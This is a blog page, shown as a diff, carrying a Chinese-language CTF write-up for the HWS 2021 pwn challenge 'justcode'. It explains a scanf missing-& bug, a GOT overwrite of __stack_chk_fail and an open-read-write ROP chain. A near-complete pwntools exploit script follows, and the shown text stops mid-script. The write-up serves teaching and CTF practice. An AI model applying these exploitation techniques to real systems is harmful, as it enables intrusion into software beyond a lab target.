@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>scanf函数漏洞的利用及&lt;vfprintf&gt;如何解决 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="前言上网查了一下，这道题是HWS 2021 冬令营选拔赛的一道pwn题。其实并不算难，只要发现并利用scanf函数的漏洞，那这道题该学会的基本都学会了，难的是明明运行正常的没有错误的解题脚本却，TM总给你各种各样的莫名奇妙的报错(忍不住爆粗口了)，害我花费了几天的时间来解决爆错的问题。 题目:justcode检查题目保护除了pie没开之外几乎所有的保护都开了(戒备森严) 还开了沙盒关掉了系统调用。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="scanf函数漏洞的利用及&lt;vfprintf&gt;如何解决">
+<meta property="og:url" content="https://dinkjun.github.io/2023/09/12/scanf%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E5%8F%8A-vfprintf-%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="前言上网查了一下，这道题是HWS 2021 冬令营选拔赛的一道pwn题。其实并不算难，只要发现并利用scanf函数的漏洞，那这道题该学会的基本都学会了，难的是明明运行正常的没有错误的解题脚本却，TM总给你各种各样的莫名奇妙的报错(忍不住爆粗口了)，害我花费了几天的时间来解决爆错的问题。 题目:justcode检查题目保护除了pie没开之外几乎所有的保护都开了(戒备森严) 还开了沙盒关掉了系统调用。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://dinkjun.github.io/2023/09/12/scanf%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E5%8F%8A-vfprintf-%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3/QQ%E6%88%AA%E5%9B%BE20230912174123.png">
+<meta property="og:image" content="https://dinkjun.github.io/2023/09/12/scanf%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E5%8F%8A-vfprintf-%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3/QQ%E6%88%AA%E5%9B%BE20230912174351.png">
+<meta property="og:image" content="https://dinkjun.github.io/2023/09/12/scanf%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E5%8F%8A-vfprintf-%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3/QQ%E6%88%AA%E5%9B%BE20230912174518.png">
+<meta property="og:image" content="https://dinkjun.github.io/2023/09/12/scanf%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E5%8F%8A-vfprintf-%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3/QQ%E6%88%AA%E5%9B%BE20230912174545.png">
+<meta property="og:image" content="https://dinkjun.github.io/2023/09/12/scanf%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E5%8F%8A-vfprintf-%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3/QQ%E6%88%AA%E5%9B%BE20230912174607.png">
+<meta property="og:image" content="https://dinkjun.github.io/2023/09/12/scanf%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E5%8F%8A-vfprintf-%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3/QQ%E6%88%AA%E5%9B%BE20230912195704.png">
+<meta property="og:image" content="https://dinkjun.github.io/2023/09/12/scanf%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E5%8F%8A-vfprintf-%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3/QQ%E6%88%AA%E5%9B%BE20230912195806.png">
+<meta property="og:image" content="https://dinkjun.github.io/2023/09/12/scanf%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E5%8F%8A-vfprintf-%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3/QQ%E6%88%AA%E5%9B%BE20230912210146.png">
+<meta property="og:image" content="https://dinkjun.github.io/2023/09/12/scanf%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E5%8F%8A-vfprintf-%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3/QQ%E6%88%AA%E5%9B%BE20230912210936.png">
+<meta property="article:published_time" content="2023-09-12T09:32:40.000Z">
+<meta property="article:modified_time" content="2023-09-12T13:26:26.598Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://dinkjun.github.io/2023/09/12/scanf%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E5%8F%8A-vfprintf-%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3/QQ%E6%88%AA%E5%9B%BE20230912174123.png">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://dinkjun.github.io"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-scanf函数漏洞的利用及-vfprintf-如何解决" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2023/09/12/scanf%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E5%8F%8A-vfprintf-%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3/" class="article-date">
+  <time datetime="2023-09-12T09:32:40.000Z" itemprop="datePublished">2023-09-12</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      scanf函数漏洞的利用及&lt;vfprintf&gt;如何解决
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>上网查了一下，这道题是HWS 2021 冬令营选拔赛的一道pwn题。其实并不算难，只要发现并利用scanf函数的漏洞，那这道题该学会的基本都学会了，难的是明明运行正常的没有错误的解题脚本却，TM总给你各种各样的莫名奇妙的报错(忍不住爆粗口了)，害我花费了几天的时间来解决爆错的问题。</p>
+<h1 id="题目-justcode"><a href="#题目-justcode" class="headerlink" title="题目:justcode"></a>题目:justcode</h1><h1 id="检查题目保护"><a href="#检查题目保护" class="headerlink" title="检查题目保护"></a>检查题目保护</h1><p>除了pie没开之外几乎所有的保护都开了(戒备森严)<br><img src="/2023/09/12/scanf%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E5%8F%8A-vfprintf-%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3/QQ%E6%88%AA%E5%9B%BE20230912174123.png" alt="Alt text"></p>
+<p>还开了沙盒关掉了系统调用。<br><img src="/2023/09/12/scanf%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E5%8F%8A-vfprintf-%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3/QQ%E6%88%AA%E5%9B%BE20230912174351.png" alt="Alt text"></p>
+<h1 id="ida查看题目代码"><a href="#ida查看题目代码" class="headerlink" title="ida查看题目代码"></a>ida查看题目代码</h1><p>main函数<br><img src="/2023/09/12/scanf%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E5%8F%8A-vfprintf-%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3/QQ%E6%88%AA%E5%9B%BE20230912174518.png" alt="Alt text"><br>case1<br><img src="/2023/09/12/scanf%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E5%8F%8A-vfprintf-%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3/QQ%E6%88%AA%E5%9B%BE20230912174545.png" alt="Alt text"><br>case2<br><img src="/2023/09/12/scanf%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E5%8F%8A-vfprintf-%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3/QQ%E6%88%AA%E5%9B%BE20230912174607.png" alt="Alt text"></p>
+<h1 id="程序流程讲解"><a href="#程序流程讲解" class="headerlink" title="程序流程讲解"></a>程序流程讲解</h1><p>程序中的main函数开始会进入</p>
+<h4 id="第一个for循环："><a href="#第一个for循环：" class="headerlink" title="第一个for循环："></a>第一个for循环：</h4><p>有四次的输入机会来让你进行输入并把内容存储在s数组里，且调用atoi函数吧s数组里的内容转换成整数并存放在V7数组里。</p>
+<h4 id="第二个for循环"><a href="#第二个for循环" class="headerlink" title="第二个for循环:"></a>第二个for循环:</h4><p>也是有四次循环，从j=0开始，V7数组的第j个元素的整数赋值给v3，以v3为参数，调用switch按照每次V3的参数选择调用对应的函数。</p>
+<h4 id="case1函数"><a href="#case1函数" class="headerlink" title="case1函数:"></a>case1函数:</h4><p>首先read函数往buf数组里，写入0x90的数据。<br>最后printf函数打印出来。</p>
+<h4 id="case2函数"><a href="#case2函数" class="headerlink" title="case2函数:"></a>case2函数:</h4><p>首先是scanf函数往V1进行%d(整型数据)类型输入，但是scanf函数的第二个函数v1没有加&amp;符号，所以会引发漏洞。<br>最后是read函数往buf数组里写入0x6c大小的数据</p>
+<h1 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h1><p>首先由于程序开启了canary保护，所以一般的栈溢出并不可行。<br>我们第一步要先突破canary保护。</p>
+<h2 id="scanf漏洞的利用"><a href="#scanf漏洞的利用" class="headerlink" title="scanf漏洞的利用"></a>scanf漏洞的利用</h2><p>由于，scanf函数第二个参数没有添加”&amp;”,程序会默认从栈中读取4个字节的数据当做scanf取的地址。并且由于case1和case2函数是平级函数，所以它们是公用一个栈的。<br>那么，我们就可以利用先利用case1的写入功能先往栈上覆盖垃圾数据最后填充栈上v1的位置为我们想要修改的地址，然后再转入case2函数利用scanf函数直接修改我们要修改的地址为我们想要的地址，实现任意地址写。</p>
+<h4 id="修改-stack-chk-fail为pop-r15-ret"><a href="#修改-stack-chk-fail为pop-r15-ret" class="headerlink" title="修改__stack_chk_fail为pop r15 ret"></a>修改__stack_chk_fail为pop r15 ret</h4><p>当canary被填充修改之后，程序最终会调用__stack_chk_fail来打印报错信息，所以我们可以通过修改__stack_chk_fail函数的got表地址从而绕过cnary保护。<br>在ida中我们可以看到V1数组和buf数组与rbp的距离，通过这个我们就可以计算出V1数组与buf数组的偏移:0x90-0x84=0xc=12<br><img src="/2023/09/12/scanf%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E5%8F%8A-vfprintf-%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3/QQ%E6%88%AA%E5%9B%BE20230912195704.png" alt="Alt text"><br><img src="/2023/09/12/scanf%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E5%8F%8A-vfprintf-%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3/QQ%E6%88%AA%E5%9B%BE20230912195806.png" alt="Alt text"><br>得出偏移之后，我们先调用case1函数填充”A”*12个垃圾数据，然后再把V1[0]填充为__stack_chk_fail函数got表地址。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">r15 = <span class="string">&quot;4198050&quot;</span> #<span class="number">0x400Ea2</span></span><br><span class="line">stack_fail = <span class="number">0x602038</span></span><br><span class="line">io.<span class="title function_">recvuntil</span>(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">12</span> + <span class="title function_">p32</span>(stack_fail) + <span class="string">&quot;aaaaaaaabbbbbbbb&quot;</span></span><br><span class="line">io.<span class="title function_">sendline</span>(payload)</span><br></pre></td></tr></table></figure>
+<p>然后调用case2函数,调用scanf函数把__stack_chk_fail函数got表地址修改为pop r15 ret的地址从而达到当调用__stack_chk_fail函数时，实际上调用pop r15 ret指令从而达到控制程序执行流的目的。<br>这里要注意:因为scanf函数的第一个参数为%d，所以发送pop r15 ret地址的时候，要把pop r15 ret地址转化为十进制的形式发送出去才行。</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">io.<span class="title function_">recvuntil</span>(<span class="string">&quot;id:&quot;</span>)</span><br><span class="line">io.<span class="title function_">sendline</span>(r15)</span><br><span class="line">io.<span class="title function_">recvuntil</span>(<span class="string">&quot;info:&quot;</span>)</span><br><span class="line">io.<span class="title function_">sendline</span>(<span class="string">&quot;AAAAA&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>在这之后我们就可以通过调用case1函数，通过read函数提前在栈上布置好rop链并填充可以覆盖canary的垃圾数据来不断地执行我们的rop链。</p>
+<h2 id="布置rop链"><a href="#布置rop链" class="headerlink" title="布置rop链"></a>布置rop链</h2><p>首先通过put函数泄露libc基址</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">io.<span class="title function_">recvuntil</span>(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line">payload = <span class="title function_">p64</span>(rdi) + <span class="title function_">p64</span>(got) + <span class="title function_">p64</span>(plt) + <span class="title function_">p64</span>(case1)</span><br><span class="line">payload = payload.<span class="title function_">ljust</span>(<span class="number">144</span>,<span class="string">&quot;A&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>获取gadget：pop rdx ret的地址</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdx = libcbase + libc.<span class="title function_">search</span>(<span class="title function_">asm</span>(<span class="string">&quot;pop rdx\nret&quot;</span>)).<span class="title function_">next</span>()</span><br></pre></td></tr></table></figure>
+<p>调用mprotect函数给bss区地址提权</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">io.<span class="title function_">recvuntil</span>(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">payload = <span class="title function_">p64</span>(rdi) + <span class="title function_">p64</span>(bss) + <span class="title function_">p64</span>(rsi) + <span class="title function_">p64</span>(<span class="number">0x1000</span>) + <span class="title function_">p64</span>(<span class="number">0x0</span>) + <span class="title function_">p64</span>(rdx) + <span class="title function_">p64</span>(<span class="number">0x7</span>) + <span class="title function_">p64</span>(mprotect) + <span class="title function_">p64</span>(ret) + <span class="title function_">p64</span>(case1)</span><br><span class="line">payload = payload.<span class="title function_">ljust</span>(<span class="number">144</span>,<span class="string">&quot;A&quot;</span>)</span><br><span class="line">io.<span class="title function_">send</span>(payload)</span><br></pre></td></tr></table></figure>
+<p>调用read函数往bss区写入”./flag\x00”</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">io.<span class="title function_">recvuntil</span>(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">payload = <span class="title function_">p64</span>(rdi) + <span class="title function_">p64</span>(<span class="number">0</span>) + <span class="title function_">p64</span>(rsi) + <span class="title function_">p64</span>(bss) + <span class="title function_">p64</span>(<span class="number">0x3</span>) + <span class="title function_">p64</span>(rdx) + <span class="title function_">p64</span>(<span class="number">0x100</span>) + <span class="title function_">p64</span>(read) + <span class="title function_">p64</span>(case1)</span><br><span class="line">payload = payload.<span class="title function_">ljust</span>(<span class="number">144</span>,<span class="string">&quot;A&quot;</span>)</span><br><span class="line">io.<span class="title function_">send</span>(payload)</span><br><span class="line">payload = <span class="title function_">p64</span>(open_) + <span class="title function_">p64</span>(write) + <span class="string">&quot;./flag\x00&quot;</span></span><br><span class="line">#payload = <span class="string">&quot;./flag\x00&quot;</span></span><br><span class="line">io.<span class="title function_">send</span>(payload)</span><br></pre></td></tr></table></figure>
+<p>最后就是ORW的常规套路了，这里就不再重复了，直接上exp吧。</p>
+<h1 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = <span class="title function_">process</span>(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"><span class="title function_">context</span>(log_level = <span class="string">&quot;debug&quot;</span>,os = <span class="string">&quot;linux&quot;</span>,arch = <span class="string">&quot;amd64&quot;</span>)</span><br><span class="line">libc = <span class="title function_">ELF</span>(<span class="string">&quot;/lib/x86_64-linux-gnu/libc-2.23.so&quot;</span>)</span><br><span class="line">elf = <span class="title function_">ELF</span>(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.<span class="title function_">recvuntil</span>(<span class="string">&quot;your code:&quot;</span>)</span><br><span class="line">io.<span class="title function_">sendline</span>(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.<span class="title function_">sendline</span>(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">io.<span class="title function_">sendline</span>(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">io.<span class="title function_">sendline</span>(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">#<span class="number">1</span></span><br><span class="line">r15 = <span class="string">&quot;4198050&quot;</span> #<span class="number">0x400Ea2</span></span><br><span class="line">stack_fail = <span class="number">0x602038</span></span><br><span class="line">io.<span class="title function_">recvuntil</span>(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">payload = <span class="string">&quot;A&quot;</span>*<span class="number">12</span> + <span class="title function_">p32</span>(stack_fail) + <span class="string">&quot;aaaaaaaabbbbbbbb&quot;</span></span><br><span class="line">io.<span class="title function_">sendline</span>(payload)</span><br><span class="line">io.<span class="title function_">recvline</span>()</span><br><span class="line"></span><br><span class="line">#<span class="number">2</span></span><br><span class="line">io.<span class="title function_">recvuntil</span>(<span class="string">&quot;id:&quot;</span>)</span><br><span class="line">io.<span class="title function_">sendline</span>(r15)</span><br><span class="line">io.<span class="title function_">recvuntil</span>(<span class="string">&quot;info:&quot;</span>)</span><br><span class="line">io.<span class="title function_">sendline</span>(<span class="string">&quot;AAAAA&quot;</span>)</span><br><span class="line">#io.<span class="title function_">recvuntil</span>(<span class="string">&quot;no check&quot;</span>)</span><br><span class="line"></span><br><span class="line">#<span class="number">3</span></span><br><span class="line">start = <span class="number">0x400E96</span></span><br><span class="line">end = <span class="number">0x400E80</span></span><br><span class="line">plt = <span class="number">0x400940</span></span><br><span class="line">got = <span class="number">0x602028</span></span><br><span class="line">case1 = <span class="number">0x400C47</span></span><br><span class="line">rdi = <span class="number">0x400ea3</span></span><br><span class="line">#<span class="number">4</span></span><br><span class="line">io.<span class="title function_">recvuntil</span>(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line">payload = <span class="title function_">p64</span>(rdi) + <span class="title function_">p64</span>(got) + <span class="title function_">p64</span>(plt) + <span class="title function_">p64</span>(case1)</span><br><span class="line">payload = payload.<span class="title function_">ljust</span>(<span class="number">144</span>,<span class="string">&quot;A&quot;</span>)</span><br><span class="line"></span><br><span class="line">#gdb.<span class="title function_">attach</span>(io,<span class="string">&quot;b *0x400E2F&quot;</span>)</span><br><span class="line">#<span class="title function_">pause</span>()</span><br><span class="line"></span><br><span class="line">io.<span class="title function_">send</span>(payload)</span><br><span class="line">io.<span class="title function_">recvuntil</span>(<span class="string">&quot;check it : &quot;</span>)</span><br><span class="line">io.<span class="title function_">recvuntil</span>(<span class="string">&quot;\n&quot;</span>)</span><br><span class="line">puts = <span class="title function_">u64</span>(io.<span class="title function_">recv</span>(<span class="number">6</span>).<span class="title function_">ljust</span>(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">print<span class="string">&quot;puts=&gt;&quot;</span>,<span class="title function_">hex</span>(puts)</span><br><span class="line">libcbase = puts - libc.<span class="property">sym</span>[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"></span><br><span class="line">open_ = libcbase + libc.<span class="property">sym</span>[<span class="string">&quot;open&quot;</span>]</span><br><span class="line">read = <span class="number">0x400980</span></span><br><span class="line">write = libcbase + libc.<span class="property">sym</span>[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">mprotect = libcbase + libc.<span class="property">sym</span>[<span class="string">&quot;mprotect&quot;</span>]</span><br><span class="line">bss = <span class="number">0x6020a0</span></span><br><span class="line">rsi = <span class="number">0x400ea1</span></span><br><span class="line">main = <span class="number">0x400D4B</span></span><br><span class="line">print<span class="string">&quot;bss=&gt;&quot;</span>,<span class="title function_">hex</span>(bss)</span><br><span class="line">print<span class="string">&quot;mprotect=&gt;&quot;</span>,<span class="title function_">hex</span>(mprotect)</span><br><span class="line">rdx = libcbase + libc.<span class="title function_">search</span>(<span class="title function_">asm</span>(<span class="string">&quot;pop rdx\nret&quot;</span>)).<span class="title function_">next</span>()</span><br><span class="line"></span><br><span class="line">#gdb.<span class="title function_">attach</span>(io,<span class="string">&quot;b *0x400E2F&quot;</span>)</span><br><span class="line">#<span class="title function_">pause</span>()</span><br><span class="line"></span><br><span class="line">#<span class="number">5</span></span><br><span class="line">io.<span class="title function_">recvuntil</span>(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">payload = <span class="title function_">p64</span>(rdi) + <span class="title function_">p64</span>(bss) + <span class="title function_">p64</span>(rsi) + <span class="title function_">p64</span>(<span class="number">0x100</span>) + <span class="title function_">p64</span>(<span class="number">0x3</span>) + <span class="title function_">p64</span>(rdx) + <span class="title function_">p64</span>(<span class="number">0x7</span>) + <span class="title function_">p64</span>(mprotect) + <span class="title function_">p64</span>(case1)</span><br><span class="line">payload = payload.<span class="title function_">ljust</span>(<span class="number">144</span>,<span class="string">&quot;A&quot;</span>)</span><br><span class="line">io.<span class="title function_">send</span>(payload)</span><br><span class="line"></span><br><span class="line">#<span class="number">6</span></span><br><span class="line">io.<span class="title function_">recvuntil</span>(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">payload = <span class="title function_">p64</span>(rdi) + <span class="title function_">p64</span>(<span class="number">0</span>) + <span class="title function_">p64</span>(rsi) + <span class="title function_">p64</span>(bss) + <span class="title function_">p64</span>(<span class="number">0x3</span>) + <span class="title function_">p64</span>(rdx) + <span class="title function_">p64</span>(<span class="number">0x100</span>) + <span class="title function_">p64</span>(read) + <span class="title function_">p64</span>(case1)</span><br><span class="line">payload = payload.<span class="title function_">ljust</span>(<span class="number">144</span>,<span class="string">&quot;A&quot;</span>)</span><br><span class="line">io.<span class="title function_">send</span>(payload)</span><br><span class="line">payload = <span class="title function_">p64</span>(open_) + <span class="title function_">p64</span>(write) + <span class="string">&quot;./flag\x00&quot;</span></span><br><span class="line">#payload = <span class="string">&quot;./flag\x00&quot;</span></span><br><span class="line">io.<span class="title function_">send</span>(payload)</span><br><span class="line"></span><br><span class="line">#<span class="number">7</span></span><br><span class="line">io.<span class="title function_">recvuntil</span>(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">payload = <span class="title function_">p64</span>(rdi) + <span class="title function_">p64</span>(<span class="number">0x6020b0</span>) + <span class="title function_">p64</span>(rsi) + <span class="title function_">p64</span>(<span class="number">0x0</span>) + <span class="title function_">p64</span>(<span class="number">0x3</span>) + <span class="title function_">p64</span>(rdx) + <span class="title function_">p64</span>(<span class="number">0x100</span>) + <span class="title function_">p64</span>(open_) + <span class="title function_">p64</span>(case1)</span><br><span class="line">payload = payload.<span class="title function_">ljust</span>(<span class="number">144</span>,<span class="string">&quot;A&quot;</span>)</span><br><span class="line">gdb.<span class="title function_">attach</span>(io,<span class="string">&quot;b *0x400E2F&quot;</span>)</span><br><span class="line"><span class="title function_">pause</span>()</span><br><span class="line">io.<span class="title function_">send</span>(payload)</span><br><span class="line"></span><br><span class="line">#<span class="number">8</span></span><br><span class="line">io.<span class="title function_">recvuntil</span>(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">payload = <span class="title function_">p64</span>(rdi) + <span class="title function_">p64</span>(<span class="number">0x3</span>) + <span class="title function_">p64</span>(rsi) + <span class="title function_">p64</span>(<span class="number">0x6020C0</span>) + <span class="title function_">p64</span>(<span class="number">0x3</span>) + <span class="title function_">p64</span>(rdx) + <span class="title function_">p64</span>(<span class="number">0x100</span>) + <span class="title function_">p64</span>(read) + <span class="title function_">p64</span>(case1)</span><br><span class="line">payload = payload.<span class="title function_">ljust</span>(<span class="number">144</span>,<span class="string">&quot;A&quot;</span>)</span><br><span class="line">io.<span class="title function_">send</span>(payload)</span><br><span class="line"></span><br><span class="line">#<span class="number">9</span></span><br><span class="line">io.<span class="title function_">recvuntil</span>(<span class="string">&quot;name&quot;</span>)</span><br><span class="line">payload = <span class="title function_">p64</span>(rdi) + <span class="title function_">p64</span>(<span class="number">0x1</span>) +  <span class="title function_">p64</span>(rsi) + <span class="title function_">p64</span>(<span class="number">0x6020C0</span>)  + <span class="title function_">p64</span>(<span class="number">0x3</span>) + <span class="title function_">p64</span>(rdx) + <span class="title function_">p64</span>(<span class="number">0x100</span>) + <span class="title function_">p64</span>(write) + <span class="title function_">p64</span>(case1)</span><br><span class="line">payload = payload.<span class="title function_">ljust</span>(<span class="number">144</span>,<span class="string">&quot;A&quot;</span>)</span><br><span class="line">io.<span class="title function_">send</span>(payload)</span><br><span class="line">io.<span class="title function_">recv</span>()</span><br><span 